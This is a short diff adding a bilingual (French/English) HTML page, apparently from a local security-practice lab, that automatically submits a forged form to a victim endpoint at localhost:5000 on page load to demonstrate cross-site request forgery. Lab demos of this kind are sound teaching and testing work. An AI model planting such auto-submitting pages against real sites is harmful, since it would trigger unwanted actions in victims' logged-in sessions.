@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CSRF Attack Exemple (local)</title>
+</head>
+<body>
+  <h1>Attaque CSRF Exemple (local)</h1>
+  <p>Ce fichier soumet automatiquement un formulaire vers la cible locale.</p>
+  <script src="/pratique/attacker.js"></script>
+  <script>
+    // target the local victim perform-action endpoint
+    window.onload = function() {
+      attacker.submitForm('http://localhost:5000/perform-action');
+    };
+  </script>
+</body>
+</html>
